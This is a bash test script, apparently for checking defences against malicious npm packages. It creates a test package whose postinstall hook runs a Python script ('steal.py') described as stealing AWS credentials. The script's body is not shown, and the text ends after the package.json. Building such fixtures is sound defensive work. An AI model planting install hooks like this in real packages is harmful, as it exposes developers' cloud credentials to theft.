#!/bin/bash
# Test script to simulate npm install with malicious packages

set -e

TEST_DIR=$(mktemp -d)
echo "Test directory: $TEST_DIR"
cd "$TEST_DIR"

# Create test package 1: Python postinstall steals AWS creds
echo "Creating test package 1: Python credential theft..."
mkdir -p test-python-malicious
cd test-python-malicious

cat > package.json << 'EOF'
{
  "name": "test-python-malicious",
  "version": "1.0.0",
  "description": "Test package with Python postinstall stealing AWS creds",
  "scripts": {
    "postinstall": "python3 steal.py"
  }
}
EOF
